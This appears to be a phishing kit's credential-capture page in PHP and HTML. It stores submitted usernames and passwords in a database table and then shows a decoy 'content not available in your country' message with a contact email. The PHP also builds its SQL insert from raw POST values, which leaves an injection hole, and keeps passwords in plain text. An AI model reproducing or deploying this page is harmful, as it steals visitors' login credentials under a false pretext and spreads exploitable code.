<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>OPSS!!!!</title>
</head>
<?php
	$username=$_POST['username'];
	$password=$_POST['password'];
	
	
  require('connect-1.php');

$cmd="insert into info(username,password) value ('$username','$password')";

mysqli_query($con,$cmd);
  ?>
  
<body> 

	<h1>OPSS...!!</h1>
	<h3>This content is not avilable in your country</h3>
	<h6>for more information contact us on motomaduro@gmail.com</h6>
	
	
	</body>
</html>